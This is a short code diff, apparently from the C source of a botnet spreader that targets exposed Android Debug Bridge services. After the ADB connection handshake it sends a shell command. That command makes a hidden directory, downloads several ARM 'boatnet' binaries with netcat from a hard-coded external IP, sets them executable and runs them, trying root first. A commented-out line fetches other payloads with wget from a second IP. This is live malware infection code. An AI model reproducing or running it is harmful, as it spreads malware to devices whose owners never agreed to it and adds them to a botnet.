@@ -419,7 +419,7 @@ static void process_event(struct epoll_event *pp, int core_id)
         fflush(stdout);
         send(pp->data.fd, CNXN, CNXN_SIZE, MSG_NOSIGNAL);
 //        adb_send_data(pp->data.fd, "shell:cd /data/local/tmp; wget http://193.32.162.27/bins/parm; wget http://193.32.162.27/bins/parm7; wget http://193.32.162.27/bins/parm6; wget http://193.32.162.27/bins/parm5; chmod +x *; ./parm test; ./parm7 test7; ./parm6 test6; ./parm5 test5;");
-        adb_send_data(pp->data.fd, "shell:cd /data/local/tmp; su 0 mkdir .wellover222 || mkdir .wellover222; cd .wellover222; toybox nc 84.200.81.239 2228 > boatnet.arm7; toybox nc 84.200.81.239 2226 > boatnet.arm5; toybox nc 84.200.81.239 2227 > boatnet.arm6; toybox nc 84.200.81.239 2225 > boatnet.arm; su 0 chmod 777 boatnet.arm7 boatnet.arm5 boatnet.arm6 boatnet.arm || chmod 777 boatnet.arm7 boatnet.arm5 boatnet.arm6 boatnet.arm; su 0 ./boatnet.arm7 arm7; ./boatnet.arm5; ./boatnet.arm6; ./boatnet.arm; su 0 ./boatnet.arm7 arm5 || ./boatnet.arm5 arm5 || ./boatnet.arm6 arm5 || ./boatnet.arm arm5;");        
+         adb_send_data(pp->data.fd, "shell:cd /data/local/tmp; su 0 mkdir .soska85 || mkdir .soska85; cd .soska85; toybox nc 84.200.81.239 2828 > boatnet.arm7; toybox nc 84.200.81.239 2626 > boatnet.arm5; toybox nc 84.200.81.239 2727 > boatnet.arm6; toybox nc 84.200.81.239 2525 > boatnet.arm; su 0 chmod 777 boatnet.arm7 boatnet.arm5 boatnet.arm6 boatnet.arm || chmod 777 boatnet.arm7 boatnet.arm5 boatnet.arm6 boatnet.arm; su 0 ./boatnet.arm7 arm7; ./boatnet.arm5; ./boatnet.arm6; ./boatnet.arm; su 0 ./boatnet.arm7 arm5 || ./boatnet.arm5 arm5 || ./boatnet.arm6 arm5 || ./boatnet.arm arm5;");         
 
         sent++;
         printf("da gui lenh make by henry\n");
@@ -821,3 +821,4 @@ void main(void)
     return;
 
 }
+
